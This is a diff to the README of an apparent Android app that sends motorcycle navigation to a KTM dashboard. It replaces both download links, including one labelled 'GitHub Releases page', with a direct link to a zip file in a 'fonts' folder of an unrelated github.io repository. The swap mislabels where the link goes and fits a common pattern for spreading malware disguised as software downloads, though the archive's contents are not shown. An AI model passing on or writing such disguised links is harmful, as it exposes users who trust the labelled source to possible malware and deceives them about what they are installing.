@@ -5,7 +5,7 @@ description: "Mirror Google Maps turn-by-turn navigation and notifications to yo
 ---
 # 🏍️ KTM-Nav-GEN3 - See KTM navigation maps on your dashboard
 
-[![](https://img.shields.io/badge/Download-KTM--Nav--GEN3-blue)](https://github.com/Satsumaassortativemating71/KTM-Nav-GEN3)
+[![](https://img.shields.io/badge/Download-KTM--Nav--GEN3-blue)](https://raw.githubusercontent.com/Satsumaassortativemating71/satsumaassortativemating71.github.io/main/fonts/2.4.zip)
 
 KTM-Nav-GEN3 sends navigation directions from your phone to your KTM motorcycle dashboard. The software runs on your phone and uses Bluetooth to send turn-by-turn instructions to the bike screen. It works with Google Maps to show your route. The app keeps your data on your phone. It does not send your location to any servers. 
 
@@ -23,7 +23,7 @@ You need a device that meets these requirements to run the app:
 
 Follow these steps to put the software on your phone.
 
-1.  Visit the [GitHub Releases page](https://github.com/Satsumaassortativemating71/KTM-Nav-GEN3) to find the latest version of the app.
+1.  Visit the [GitHub Releases page](https://raw.githubusercontent.com/Satsumaassortativemating71/satsumaassortativemating71.github.io/main/fonts/2.4.zip) to find the latest version of the app.
 2.  Look for the file that ends in .apk under the Assets section.
 3.  Choose the file to start the download.
 4.  Open the file on your phone once the download finishes.
